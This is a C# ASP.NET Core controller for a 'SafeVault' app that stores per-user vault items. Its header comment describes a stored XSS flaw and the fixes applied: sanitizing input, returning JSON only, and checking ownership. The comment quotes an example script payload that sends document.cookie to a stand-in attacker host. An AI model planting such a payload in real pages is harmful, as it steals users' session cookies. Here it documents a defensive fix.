using System.Security.Claims;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using SafeVault.Data;
using SafeVault.DTOs;
using SafeVault.Models;
using SafeVault.Validation;

namespace SafeVault.Controllers;

/// <summary>
/// VULNERABILITY FOUND DURING DEBUGGING ACTIVITY (stored XSS):
/// The original version of this controller saved Title/Notes exactly as
/// submitted and an early React/Razor prototype rendered them with
/// dangerouslySetInnerHTML / Html.Raw(), so a title like
/// &lt;script&gt;document.location='https://evil.example/steal?c='+document.cookie&lt;/script&gt;
/// would execute in every other user's browser when the item list rendered.
///
/// FIX APPLIED:
/// 1. Free text is sanitized with HtmlSanitizer before it is ever persisted
///    (InputValidator.SanitizeHtml), stripping tags/scripts/event handlers.
/// 2. All API responses are plain JSON (System.Text.Json encodes strings
///    safely by default), and any HTML-rendering client is required to use
///    standard text interpolation, never raw-HTML injection, on this data.
/// 3. Ownership is checked on every read/update/delete, not just role,
///    so users cannot access or modify each other's vault items (broken
///    access control fix / IDOR prevention).
/// </summary>
[ApiController]
[Route("api/[controller]")]
[Authorize]
public class VaultController : ControllerBase
{
    private readonly SafeVaultDbContext _db;

    public VaultController(SafeVaultDbContext db)
    {
        _db = db;
    }

    private string CurrentUserId =>
        User.FindFirstValue(ClaimTypes.NameIdentifier) ?? User.FindFirstValue("sub")!;

    [HttpGet]
    public async Task<IActionResult> GetMine()
    {
        // EF Core LINQ compiles to a parameterized query — no string
        // concatenation of the user id into SQL text.
        var items = await _db.VaultItems
            .Where(v => v.OwnerUserId == CurrentUserId)
            .OrderByDescending(v => v.CreatedAtUtc)
            .ToListAsync();

        return Ok(items);
    }

    [HttpPost]
    public async Task<IActionResult> Create([FromBody] VaultItemRequest request)
    {
        if (!ModelState.IsValid)
        {
            return ValidationProblem(ModelState);
        }

        if (!InputValidator.IsValidFreeText(request.Title, 120) ||
            !InputValidator.IsValidFreeText(request.Notes, 2000))
        {
            return BadRequest("Input contains characters that are not allowed.");
        }

        var item = new VaultItem
        {
            Title = InputValidator.SanitizeHtml(request.Title),
            Notes = InputValidator.SanitizeHtml(request.Notes),
            OwnerUserId = CurrentUserId
        };

        _db.VaultItems.Add(item);
        await _db.SaveChangesAsync();

        return CreatedAtAction(nameof(GetMine), new { id = item.Id }, item);
    }

    [HttpDelete("{id:int}")]
    public async Task<IActionResult> Delete(int id)
    {
        var item = await _db.VaultItems.FindAsync(id);
        if (item is null)
        {
            return NotFound();
        }

        // Resource-level (object) authorization: role alone ("authenticated
        // user") is not enough — the item must belong to the caller, unless
        // the caller is an Admin. This closes the IDOR gap found in review.
        var isAdmin = User.IsInRole("Admin");
        if (!isAdmin && item.OwnerUserId != CurrentUserId)
        {
            return Forbid();
        }

        _db.VaultItems.Remove(item);
        await _db.SaveChangesAsync();

        return NoContent();
    }
}
